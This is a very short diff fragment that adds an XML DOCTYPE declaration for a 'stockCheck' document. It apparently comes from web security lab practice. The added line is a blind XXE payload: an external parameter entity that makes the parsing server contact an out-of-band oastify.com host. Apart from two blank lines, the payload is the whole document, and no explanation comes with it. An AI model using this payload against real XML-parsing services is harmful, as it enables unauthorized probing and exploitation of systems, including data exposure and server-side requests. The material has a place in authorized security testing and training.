@@ -1,0 +1,3 @@
+
+
+<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "http://88ef58uc2q710bb0yklwex5uilocc1.oastify.com"> %xxe;]>
